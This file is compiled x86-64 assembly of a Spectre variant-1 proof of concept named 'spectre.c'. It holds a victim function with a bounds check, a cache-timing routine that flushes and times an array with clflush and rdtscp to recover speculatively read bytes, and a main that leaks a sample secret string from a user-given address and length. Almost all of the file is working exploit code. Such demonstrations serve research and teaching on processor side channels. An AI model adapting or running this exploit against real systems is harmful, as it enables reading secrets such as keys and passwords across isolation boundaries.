	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	xor	eax, eax
	cmp	rdi, 16
	setb	al
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	cmp	dword ptr [rsi], 0
	je	.LBB1_2
# %bb.1:
	movzx	eax, byte ptr [rdi + array1]
	shl	rax, 9
	mov	al, byte ptr [rax + array2]
	and	byte ptr [rip + temp], al
.LBB1_2:
	ret
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	push	r15
	.cfi_def_cfa_offset 24
	push	r14
	.cfi_def_cfa_offset 32
	push	r13
	.cfi_def_cfa_offset 40
	push	r12
	.cfi_def_cfa_offset 48
	push	rbx
	.cfi_def_cfa_offset 56
	sub	rsp, 40
	.cfi_def_cfa_offset 96
	.cfi_offset rbx, -56
	.cfi_offset r12, -48
	.cfi_offset r13, -40
	.cfi_offset r14, -32
	.cfi_offset r15, -24
	.cfi_offset rbp, -16
	mov	qword ptr [rsp + 16], rdx       # 8-byte Spill
	mov	qword ptr [rsp + 8], rsi        # 8-byte Spill
	mov	qword ptr [rsp + 24], rdi       # 8-byte Spill
	mov	edi, offset readMemoryByte.results
	mov	edx, 1024
	xor	esi, esi
	call	memset
	mov	r13d, 999
	mov	ebx, 2863311531
	jmp	.LBB2_2
	.p2align	4, 0x90
.LBB2_1:                                #   in Loop: Header=BB2_2 Depth=1
	lea	esi, [r8 - 1]
	cmp	r8d, 2
	mov	r13d, esi
	jb	.LBB2_23
.LBB2_2:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_3 Depth 2
                                        #     Child Loop BB2_5 Depth 2
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_12 Depth 2
	xor	eax, eax
	.p2align	4, 0x90
.LBB2_3:                                #   Parent Loop BB2_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	byte ptr [rax + array2]
	clflush	byte ptr [rax + array2+512]
	clflush	byte ptr [rax + array2+1024]
	clflush	byte ptr [rax + array2+1536]
	clflush	byte ptr [rax + array2+2048]
	clflush	byte ptr [rax + array2+2560]
	clflush	byte ptr [rax + array2+3072]
	clflush	byte ptr [rax + array2+3584]
	add	rax, 4096
	cmp	rax, 131072
	jne	.LBB2_3
# %bb.4:                                #   in Loop: Header=BB2_2 Depth=1
	mov	qword ptr [rsp + 32], r13       # 8-byte Spill
                                        # kill: def $r13d killed $r13d killed $r13 def $r13
	and	r13d, 15
	mov	rbp, r13
	xor	rbp, qword ptr [rsp + 24]       # 8-byte Folded Reload
	mov	r15d, 29
	mov	r12d, -30
	mov	r14d, 28
	.p2align	4, 0x90
.LBB2_5:                                #   Parent Loop BB2_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	eax, r15d
	imul	rax, rbx
	shr	rax, 34
	add	eax, eax
	lea	eax, [rax + 2*rax]
	mov	ecx, r14d
	sub	ecx, eax
	add	eax, r12d
	xor	edx, edx
	cmp	eax, -1
	sete	dl
	mov	dword ptr [rip + x_is_safe_static], edx
	#APP
	mfence

	#NO_APP
	clflush	byte ptr [rip + x_is_safe_static]
	#APP
	mfence

	#NO_APP
	and	ecx, -65536
	movsxd	rax, ecx
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, rbp
	xor	rdi, r13
	mov	esi, offset x_is_safe_static
	call	victim_function
	mov	dword ptr [rip + x_is_safe_static], 16
	add	r15d, -1
	add	r14d, -1
	inc	r12d
	jne	.LBB2_5
# %bb.6:                                #   in Loop: Header=BB2_2 Depth=1
	mov	edi, 13
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_10:                               #   in Loop: Header=BB2_7 Depth=2
	add	edi, 167
	cmp	edi, 42765
	je	.LBB2_11
.LBB2_7:                                #   Parent Loop BB2_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzx	ebx, dil
	mov	rbp, rbx
	shl	rbp, 9
	rdtscp
	mov	rsi, rdx
	shl	rsi, 32
	or	rsi, rax
	movzx	eax, byte ptr [rbp + array2]
	rdtscp
	shl	rdx, 32
	or	rdx, rax
	sub	rdx, rsi
	cmp	rdx, 100
	ja	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	cmp	dil, byte ptr [r13 + array1]
	je	.LBB2_10
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, ebx
	add	dword ptr [4*rax + readMemoryByte.results], 1
	jmp	.LBB2_10
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_2 Depth=1
	mov	edx, -1
	xor	eax, eax
	mov	esi, -1
	mov	r8, qword ptr [rsp + 32]        # 8-byte Reload
	mov	ebx, 2863311531
	jmp	.LBB2_12
	.p2align	4, 0x90
.LBB2_19:                               #   in Loop: Header=BB2_12 Depth=2
	mov	esi, edx
	mov	edx, edi
	add	rax, 2
	cmp	rax, 256
	je	.LBB2_20
.LBB2_12:                               #   Parent Loop BB2_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	test	edx, edx
	js	.LBB2_13
# %bb.14:                               #   in Loop: Header=BB2_12 Depth=2
	mov	edi, dword ptr [4*rax + readMemoryByte.results]
	mov	ebp, edx
	cmp	edi, dword ptr [4*rbp + readMemoryByte.results]
	jge	.LBB2_13
# %bb.15:                               #   in Loop: Header=BB2_12 Depth=2
	test	esi, esi
	js	.LBB2_17
# %bb.16:                               #   in Loop: Header=BB2_12 Depth=2
	mov	ebp, esi
	cmp	edi, dword ptr [4*rbp + readMemoryByte.results]
	jl	.LBB2_18
.LBB2_17:                               #   in Loop: Header=BB2_12 Depth=2
	mov	esi, eax
.LBB2_18:                               #   in Loop: Header=BB2_12 Depth=2
	lea	rdi, [rax + 1]
	test	edx, edx
	jns	.LBB2_24
	jmp	.LBB2_19
	.p2align	4, 0x90
.LBB2_13:                               #   in Loop: Header=BB2_12 Depth=2
	mov	esi, edx
	mov	edx, eax
	lea	rdi, [rax + 1]
	test	edx, edx
	js	.LBB2_19
.LBB2_24:                               #   in Loop: Header=BB2_12 Depth=2
	mov	ebp, dword ptr [4*rax + readMemoryByte.results+4]
	mov	ebx, edx
	cmp	ebp, dword ptr [4*rbx + readMemoryByte.results]
	jge	.LBB2_25
# %bb.26:                               #   in Loop: Header=BB2_12 Depth=2
	test	esi, esi
	js	.LBB2_28
# %bb.27:                               #   in Loop: Header=BB2_12 Depth=2
	mov	ebx, esi
	cmp	ebp, dword ptr [4*rbx + readMemoryByte.results]
	jl	.LBB2_29
.LBB2_28:                               #   in Loop: Header=BB2_12 Depth=2
	mov	esi, edi
	jmp	.LBB2_29
	.p2align	4, 0x90
.LBB2_25:                               #   in Loop: Header=BB2_12 Depth=2
	mov	esi, edx
	mov	edx, edi
.LBB2_29:                               #   in Loop: Header=BB2_12 Depth=2
	mov	ebx, 2863311531
	add	rax, 2
	cmp	rax, 256
	jne	.LBB2_12
.LBB2_20:                               #   in Loop: Header=BB2_2 Depth=1
	movsxd	rdx, edx
	mov	edi, dword ptr [4*rdx + readMemoryByte.results]
	movsxd	rax, esi
	mov	esi, dword ptr [4*rax + readMemoryByte.results]
	lea	ebp, [rsi + rsi]
	add	ebp, 5
	cmp	edi, ebp
	jge	.LBB2_23
# %bb.21:                               #   in Loop: Header=BB2_2 Depth=1
	cmp	edi, 2
	jne	.LBB2_1
# %bb.22:                               #   in Loop: Header=BB2_2 Depth=1
	test	esi, esi
	jne	.LBB2_1
.LBB2_23:
	xor	dword ptr [rip + readMemoryByte.results], ecx
	mov	rsi, qword ptr [rsp + 8]        # 8-byte Reload
	mov	byte ptr [rsi], dl
	mov	ecx, dword ptr [4*rdx + readMemoryByte.results]
	mov	rdx, qword ptr [rsp + 16]       # 8-byte Reload
	mov	dword ptr [rdx], ecx
	mov	byte ptr [rsi + 1], al
	mov	eax, dword ptr [4*rax + readMemoryByte.results]
	mov	dword ptr [rdx + 4], eax
	add	rsp, 40
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	r12
	.cfi_def_cfa_offset 40
	pop	r13
	.cfi_def_cfa_offset 32
	pop	r14
	.cfi_def_cfa_offset 24
	pop	r15
	.cfi_def_cfa_offset 16
	pop	rbp
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	push	r15
	.cfi_def_cfa_offset 24
	push	r14
	.cfi_def_cfa_offset 32
	push	r13
	.cfi_def_cfa_offset 40
	push	r12
	.cfi_def_cfa_offset 48
	push	rbx
	.cfi_def_cfa_offset 56
	sub	rsp, 40
	.cfi_def_cfa_offset 96
	.cfi_offset rbx, -56
	.cfi_offset r12, -48
	.cfi_offset r13, -40
	.cfi_offset r14, -32
	.cfi_offset r15, -24
	.cfi_offset rbp, -16
	mov	qword ptr [rsp + 32], rsi       # 8-byte Spill
	cmp	edi, 3
	jne	.LBB3_1
# %bb.10:
	lea	r13, [rsp + 14]
	lea	rbx, [rsp + 24]
	mov	r15d, offset .L.str.9
	.p2align	4, 0x90
.LBB3_11:                               # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_17 Depth 2
	mov	rdi, qword ptr [rip + stdin]
	call	getc
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB3_11
# %bb.12:                               #   in Loop: Header=BB3_11 Depth=1
	cmp	eax, 1912602624
	je	.LBB3_15
# %bb.13:                               #   in Loop: Header=BB3_11 Depth=1
	cmp	eax, 1761607680
	jne	.LBB3_21
# %bb.14:                               #   in Loop: Header=BB3_11 Depth=1
	xor	eax, eax
	call	getpid
	mov	edi, offset .L.str.13
	mov	esi, offset check+33
	mov	edx, eax
	xor	eax, eax
	call	printf
	jmp	.LBB3_11
	.p2align	4, 0x90
.LBB3_15:                               #   in Loop: Header=BB3_11 Depth=1
	mov	rdx, qword ptr [rip + secret]
	mov	edi, offset .L.str.1
	mov	rsi, rdx
	xor	eax, eax
	call	printf
	mov	rdi, qword ptr [rip + secret]
	mov	rax, rdi
	mov	r14d, offset array1
	sub	rax, r14
	mov	qword ptr [rsp + 16], rax
	call	strlen
	mov	dword ptr [rsp + 8], eax
	mov	edi, offset array2
	mov	edx, 131072
	mov	esi, 1
	call	memset
	mov	rbp, qword ptr [rsp + 32]       # 8-byte Reload
	mov	rdi, qword ptr [rbp + 8]
	mov	esi, offset .L.str.2
	lea	rdx, [rsp + 16]
	xor	eax, eax
	call	__isoc99_sscanf
	sub	qword ptr [rsp + 16], r14
	mov	rdi, qword ptr [rbp + 16]
	mov	esi, offset .L.str.3
	lea	rdx, [rsp + 8]
	xor	eax, eax
	call	__isoc99_sscanf
	mov	rsi, qword ptr [rsp + 16]
	mov	edx, dword ptr [rsp + 8]
	mov	edi, offset .L.str.4
	xor	eax, eax
	call	printf
	mov	esi, dword ptr [rsp + 8]
	mov	edi, offset .L.str.5
	xor	eax, eax
	call	printf
	mov	eax, dword ptr [rsp + 8]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp + 8], ecx
	test	eax, eax
	jle	.LBB3_11
# %bb.16:                               #   in Loop: Header=BB3_11 Depth=1
	xor	r12d, r12d
	jmp	.LBB3_17
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_17 Depth=2
	add	r12, 1
	mov	edi, 10
	call	putchar
	mov	eax, dword ptr [rsp + 8]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp + 8], ecx
	test	eax, eax
	jle	.LBB3_11
.LBB3_17:                               #   Parent Loop BB3_11 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	rsi, qword ptr [rsp + 16]
	mov	rax, qword ptr [rip + secret]
	movsx	edx, byte ptr [rax + r12]
	mov	edi, offset .L.str.6
	xor	eax, eax
	call	printf
	mov	rdi, qword ptr [rsp + 16]
	lea	rax, [rdi + 1]
	mov	qword ptr [rsp + 16], rax
	mov	rsi, r13
	mov	rdx, rbx
	call	readMemoryByte
	mov	r14d, dword ptr [rsp + 24]
	mov	ebp, dword ptr [rsp + 28]
	lea	eax, [rbp + rbp]
	cmp	r14d, eax
	mov	esi, offset .L.str.8
	cmovl	rsi, r15
	mov	edi, offset .L.str.7
	xor	eax, eax
	call	printf
	movzx	esi, byte ptr [rsp + 14]
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	mov	edi, offset .L.str.10
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, r14d
	xor	eax, eax
	call	printf
	test	ebp, ebp
	jle	.LBB3_19
# %bb.18:                               #   in Loop: Header=BB3_17 Depth=2
	movzx	esi, byte ptr [rsp + 15]
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	mov	edi, offset .L.str.11
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, ebp
	xor	eax, eax
	call	printf
	jmp	.LBB3_19
.LBB3_1:
	lea	r14, [rsp + 14]
	lea	r15, [rsp + 24]
	mov	r13d, offset .L.str.9
	jmp	.LBB3_2
	.p2align	4, 0x90
.LBB3_20:                               #   in Loop: Header=BB3_2 Depth=1
	xor	eax, eax
	call	getpid
	mov	edi, offset .L.str.13
	mov	esi, offset check+33
	mov	edx, eax
	xor	eax, eax
	call	printf
.LBB3_2:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_7 Depth 2
	mov	rdi, qword ptr [rip + stdin]
	call	getc
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB3_2
# %bb.3:                                #   in Loop: Header=BB3_2 Depth=1
	cmp	eax, 1761607680
	je	.LBB3_20
# %bb.4:                                #   in Loop: Header=BB3_2 Depth=1
	cmp	eax, 1912602624
	jne	.LBB3_21
# %bb.5:                                #   in Loop: Header=BB3_2 Depth=1
	mov	rdx, qword ptr [rip + secret]
	mov	edi, offset .L.str.1
	mov	rsi, rdx
	xor	eax, eax
	call	printf
	mov	rdi, qword ptr [rip + secret]
	mov	rax, rdi
	mov	ecx, offset array1
	sub	rax, rcx
	mov	qword ptr [rsp + 16], rax
	call	strlen
	mov	rbp, rax
	mov	dword ptr [rsp + 8], ebp
	mov	edi, offset array2
	mov	edx, 131072
	mov	esi, 1
	call	memset
	mov	edi, offset .L.str.5
	mov	esi, ebp
	xor	eax, eax
	call	printf
	mov	eax, dword ptr [rsp + 8]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp + 8], ecx
	test	eax, eax
	jle	.LBB3_2
# %bb.6:                                #   in Loop: Header=BB3_2 Depth=1
	xor	r12d, r12d
	jmp	.LBB3_7
	.p2align	4, 0x90
.LBB3_9:                                #   in Loop: Header=BB3_7 Depth=2
	add	r12, 1
	mov	edi, 10
	call	putchar
	mov	eax, dword ptr [rsp + 8]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp + 8], ecx
	test	eax, eax
	jle	.LBB3_2
.LBB3_7:                                #   Parent Loop BB3_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	rsi, qword ptr [rsp + 16]
	mov	rax, qword ptr [rip + secret]
	movsx	edx, byte ptr [rax + r12]
	mov	edi, offset .L.str.6
	xor	eax, eax
	call	printf
	mov	rdi, qword ptr [rsp + 16]
	lea	rax, [rdi + 1]
	mov	qword ptr [rsp + 16], rax
	mov	rsi, r14
	mov	rdx, r15
	call	readMemoryByte
	mov	ebx, dword ptr [rsp + 24]
	mov	ebp, dword ptr [rsp + 28]
	lea	eax, [rbp + rbp]
	cmp	ebx, eax
	mov	esi, offset .L.str.8
	cmovl	rsi, r13
	mov	edi, offset .L.str.7
	xor	eax, eax
	call	printf
	movzx	esi, byte ptr [rsp + 14]
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	mov	edi, offset .L.str.10
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, ebx
	xor	eax, eax
	call	printf
	test	ebp, ebp
	jle	.LBB3_9
# %bb.8:                                #   in Loop: Header=BB3_7 Depth=2
	movzx	esi, byte ptr [rsp + 15]
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	mov	edi, offset .L.str.11
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, ebp
	xor	eax, eax
	call	printf
	jmp	.LBB3_9
.LBB3_21:
	xor	eax, eax
	add	rsp, 40
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	r12
	.cfi_def_cfa_offset 40
	pop	r13
	.cfi_def_cfa_offset 32
	pop	r14
	.cfi_def_cfa_offset 24
	pop	r15
	.cfi_def_cfa_offset 16
	pop	rbp
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	x_is_safe_static,@object        # @x_is_safe_static
	.data
	.globl	x_is_safe_static
	.p2align	2
x_is_safe_static:
	.long	16                              # 0x10
	.size	x_is_safe_static, 4

	.type	array1,@object                  # @array1
	.globl	array1
	.p2align	4
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	array2,@object                  # @array2
	.globl	array2
	.p2align	4
array2:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	131056
	.size	array2, 131072

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	3
secret:
	.quad	.L.str
	.size	secret, 8

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,16
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
	.p2align	4
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
	.p2align	4
unused2:
	.zero	64
	.size	unused2, 64

	.type	unused3,@object                 # @unused3
	.globl	unused3
	.p2align	4
unused3:
	.zero	64
	.size	unused3, 64

	.ident	"Ubuntu clang version 11.1.0-6"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym x_is_safe_static
	.addrsig_sym array1
	.addrsig_sym array2
